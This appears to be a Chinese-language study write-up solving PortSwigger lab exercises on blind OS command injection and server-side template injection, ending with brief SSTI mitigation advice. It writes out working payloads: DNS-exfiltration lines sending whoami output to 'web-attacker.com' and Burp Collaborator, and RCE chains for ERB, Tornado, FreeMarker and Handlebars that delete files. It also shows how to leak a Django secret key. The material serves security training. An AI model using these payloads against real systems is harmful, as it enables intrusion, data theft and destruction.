### 题目

实验2：具有时延的操作系统命令盲注入

```
Lab: Blind OS command injection with time delays
PRACTITIONER

This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response.

To solve the lab, exploit the blind OS command injection vulnerability to cause a 10 second delay.
```

### 答案

```
123@123.com||ping -c 10 127.0.0.1 &
```

<img src=".\图片\Snipaste_2023-07-31_20-46-20.png" alt="Snipaste_2023-07-31_20-46-20" style="zoom:80%;" />

无回显但是发现有明显延时效果

## Lab3

### 前置

通过重定向输出利用盲目操作系统命令注入

1、可以将注入命令的输出重定向到Web根目录中的文件中，然后可以使用浏览器检索该文件。例如，如果应用程序从文件系统位置/var/www/static提供静态资源，则可以提交以下输入：

```
& whoami > /var/www/static/whoami.txt &
（学过Linux的应该都会这些命令）
```

2、解释：>字符发送来自whoami命令添加到指定文件（这里是输出到whoami.txt，没有就自动创建）。然后可以使用浏览器获取 `https://vulnerable-website.com/whoami.txt` 以检索文件，并查看插入命令的输出。 

### 题目

实验3：带有输出重定向的盲操作系统命令注入

```
Lab: Blind OS command injection with output redirection
PRACTITIONER

This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response. However, you can use output redirection to capture the output from the command. There is a writable folder at:

/var/www/images/
The application serves the images for the product catalog from this location. You can redirect the output from the injected command to a file in this folder, and then use the image loading URL to retrieve the contents of the file.

To solve the lab, execute the whoami command and retrieve the output.
```

### 答案

抓包实验，`/var/www/images` 为网站路径

```
email=||whoami>/var/www/images/output.txt||
```

<img src=".\图片\Snipaste_2023-07-31_20-55-58.png" alt="Snipaste_2023-07-31_20-55-58" style="zoom:80%;" />

寻找文件包含的地方，读取文件

```
filename=output.txt
```

<img src=".\图片\Snipaste_2023-07-31_20-59-27.png" alt="Snipaste_2023-07-31_20-59-27" style="zoom:80%;" />

## Lab4

### 前置

#### 利用带外（OAST）技术

1、简述：

可以使用一个注入命令，该命令将触发与您使用OAST技术控制的系统的带外网络交互。例如

```
& nslookup kgji2ohoyw.web-attacker.com &
```

此有效负载使用nslookup命令对指定的域进行DNS查找。攻击者可以监视指定查找的发生，从而检测到命令已成功插入。

2、带外通道还提供了一种从注入命令中提取输出的简单方法：

```
& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
```

这将导致对攻击者的域进行DNS查找，该域包含whoami命令：

```
wwwuser.kgji2ohoyw.web-attacker.com
```

### 题目

实验4：具有带外交互的盲OS命令注入

```
Lab: Blind OS command injection with out-of-band interaction
PRACTITIONER

This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, exploit the blind OS command injection vulnerability to issue a DNS lookup to Burp Collaborator.
```

### 答案

在功能点上抓包，修改

```
email=x||nslookup x.BURP-COLLABORATOR-SUBDOMAIN||
```

类似dnslog平台外带，我的为：

```
email=x||nslookup x.c6j255p6b8zyjmu2ry8whruy3p9fx4.burpcollaborator.net||
```

```
email=x||nslookup & nslookup `whoami`.c6j255p6b8zyjmu2ry8whruy3p9fx4.burpcollaborator.net||
```

<img src=".\图片\Snipaste_2023-07-31_21-09-52.png" alt="Snipaste_2023-07-31_21-09-52" style="zoom:80%;" />

## Lab5

操作与Lab4一样，就不再操作了

```
email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||
我的是：
email=x||nslookup+`whoami`.fl45n2ug5x4nmill7s67s7u7jypodd.burpcollaborator.net||
```

# Server-side template injection

[梨子带你刷burpsuite靶场系列之高级漏洞篇 - 服务器端模板注入(SSTI)专题-安全客 - 安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/246293)

## Lab1

### 题目

```
Lab: Basic server-side template injection
PRACTITIONER

This lab is vulnerable to server-side template injection due to the unsafe construction of an ERB template.

To solve the lab, review the ERB documentation to find out how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.
```

### 答案

在 url 中 的 message 参数 的位置 把  `Unfortunately this product is out of stock` 提示信息 改为

```
<%= 7*7 %>
```

观察现象，发现 7*7 被解析成了 49

<img src=".\图片\Snipaste_2023-08-01_13-50-53.png" alt="Snipaste_2023-08-01_13-50-53" style="zoom:80%;" />

From the Ruby documentation, discover the `system()` method, which can be used to execute arbitrary operating system commands：

```
<%= system("cat /home/carlos/morale.txt") %>
```

ruby 语言的 执行命令函数，发现成功删除 `morale.txt` 文件

<img src=".\图片\Snipaste_2023-08-01_13-52-38.png" alt="Snipaste_2023-08-01_13-52-38" style="zoom:80%;" />

## Lab2

### 题目

```
Lab: Basic server-side template injection (code context)
PRACTITIONER

This lab is vulnerable to server-side template injection due to the way it unsafely uses a Tornado template. To solve the lab, review the Tornado documentation to discover how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.

You can log in to your own account using the following credentials: wiener:peter
```

### 答案

在功能点抓包

<img src=".\图片\Snipaste_2023-08-01_14-03-20.png" alt="Snipaste_2023-08-01_14-03-20" style="zoom:67%;" />

<img src=".\图片\Snipaste_2023-08-01_14-03-55.png" alt="Snipaste_2023-08-01_14-03-55" style="zoom:80%;" />

尝试ssti模版注入，尝试闭合

```
blog-post-author-display=user.name}}{{7*7}}
```

<img src=".\图片\Snipaste_2023-08-01_14-17-12.png" alt="Snipaste_2023-08-01_14-17-12" style="zoom:80%;" />

观察评论处我们的name，被解析成了 `Peter Wiener49}}`

<img src=".\图片\Snipaste_2023-08-01_14-18-01.png" alt="Snipaste_2023-08-01_14-18-01" style="zoom:80%;" />

于是尝试命令执行，这里是 python 语言

```
blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('rm%20/home/carlos/morale.txt')
```

<img src=".\图片\Snipaste_2023-08-01_14-26-55.png" alt="Snipaste_2023-08-01_14-26-55" style="zoom:80%;" />

然后去文章评论去刷新便可以触发执行命令了

## Lab3

### 题目

```
Lab: Server-side template injection using documentation
PRACTITIONER

This lab is vulnerable to server-side template injection. To solve the lab, identify the template engine and use the documentation to work out how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.

You can log in to your own account using the following credentials:

content-manager:C0nt3ntM4n4g3r
```

### 答案

首先因为题目中没有告诉我们这是哪一款模板引擎，所以我们要让它们使用的**模板语句故意报错**，从报错信息中我们一般可以知道使用的是哪种模板引擎，在编辑模板的 `${}` 模板表达式中随便输入些什么，就会触发报错

<img src=".\图片\Snipaste_2023-08-01_14-38-36.png" alt="Snipaste_2023-08-01_14-38-36" style="zoom:80%;" />

然后我们就可以对症下药了，我们需要去查阅一下相关的文档，看看有没有相关警示项，我们直接去搜freemarker ssti，找到一个利用内置函数执行os命令，payload模板如下

```
<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("[payload]")}
```

于是我们在编辑模板的地方将payload写入模板表达式

```
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm /home/carlos/morale.txt") }
```

<img src=".\图片\Snipaste_2023-08-01_14-40-02.png" alt="Snipaste_2023-08-01_14-40-02" style="zoom:80%;" />

## Lab4

### 题目

```
Lab: Server-side template injection in an unknown language with a documented exploit
PRACTITIONER

This lab is vulnerable to server-side template injection. To solve the lab, identify the template engine and find a documented exploit online that you can use to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.
```

### 答案

顾名思义，就是当知道使用的是哪种模板引擎后可以**利用搜索引擎查找**是否有前人总结的漏洞利用方法，这样可以节约很多查阅文档的时间

因为不知道使用的是哪一款模板引擎，所以我们需要输入各种版本的错误模板表达式以触发报错

```
${{<%[%'"}}%\
```

<img src=".\图片\Snipaste_2023-08-01_14-45-26.png" alt="Snipaste_2023-08-01_14-45-26" style="zoom:80%;" />

然后我们就利用搜索引擎查找一下有没有相关的现成的利用方式，搜到了一个知名的payload模板

Search the web for "Handlebars server-side template injection". You should find a well-known exploit posted by `@Zombiehelp54`.

Modify this exploit so that it calls `require("child_process").exec("rm /home/carlos/morale.txt")` as follows:

```
wrtz{{#with "s" as |string|}}
    {{#with "e"}}
        {{#with split as |conslist|}}
            {{this.pop}}
            {{this.push (lookup string.sub "constructor")}}
            {{this.pop}}
            {{#with string.split as |codelist|}}
                {{this.pop}}
                {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
                {{this.pop}}
                {{#each conslist}}
                    {{#with (string.sub.apply 0 codelist)}}
                        {{this}}
                    {{/with}}
                {{/each}}
            {{/with}}
        {{/with}}
    {{/with}}
{{/with}}
```

用 url 编码后发送

```
wrtz%7B%7B%23with%20%22s%22%20as%20%7Cstring%7C%7D%7D%0A%20%20%20%20%7B%7B%23with%20%22e%22%7D%7D%0A%20%20%20%20%20%20%20%20%7B%7B%23with%20split%20as%20%7Cconslist%7C%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7B%7Bthis.pop%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7B%7Bthis.push%20%28lookup%20string.sub%20%22constructor%22%29%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7B%7Bthis.pop%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7B%7B%23with%20string.split%20as%20%7Ccodelist%7C%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7B%7Bthis.pop%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7B%7Bthis.push%20%22return%20require%28%27child_process%27%29.exec%28%27rm%20%2Fhome%2Fcarlos%2Fmorale.txt%27%29%3B%22%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7B%7Bthis.pop%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7B%7B%23each%20conslist%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7B%7B%23with%20%28string.sub.apply%200%20codelist%29%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7B%7Bthis%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7B%7B%2Feach%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0A%20%20%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0A%20%20%20%20%7B%7B%2Fwith%7D%7D%0A%7B%7B%2Fwith%7D%7D
```

<img src=".\图片\Snipaste_2023-08-01_14-47-50.png" alt="Snipaste_2023-08-01_14-47-50" style="zoom:67%;" />

## Lab5

### 题目

```
Lab: Server-side template injection with information disclosure via user-supplied objects
PRACTITIONER

This lab is vulnerable to server-side template injection due to the way an object is being passed into the template. This vulnerability can be exploited to access sensitive data.

To solve the lab, steal and submit the framework's secret key.

You can log in to your own account using the following credentials:

content-manager:C0nt3ntM4n4g3r
```

### 答案

先 fuzz 测试报错

```
${{<%[%'"}}%\
```

<img src=".\图片\Snipaste_2023-08-01_14-55-00.png" alt="Snipaste_2023-08-01_14-55-00" style="zoom:80%;" />

经过查阅文档得知，有一个内置的模板标签{% debug %}，可以显示调试信息

```
{% debug %}
```

然后又查阅文档得知，`{{settings.SECRET_KEY}}` 表达式可以查看指定的环境变量

```
{{settings.SECRET_KEY}}
```

<img src=".\图片\Snipaste_2023-08-01_15-01-23.png" alt="Snipaste_2023-08-01_15-01-23" style="zoom:80%;" />

## 如何缓解SSTI攻击？

避免引入SSTI漏洞的最简单方法之一是始终使用“无逻辑”模板引擎，如Mustache，除非绝对必要。尽可能将逻辑层与渲染层分离，可以大大减少面临最危险的基于模板的攻击的风险。另一种措施是仅在沙盒环境中执行用户的代码，在该环境中，潜在危险的模块和功能已被完全删除。但是沙箱也会存在被绕过的风险。最后，另一种补充方法是通过在封闭的Docker容器中部署模板环境来部署沙箱


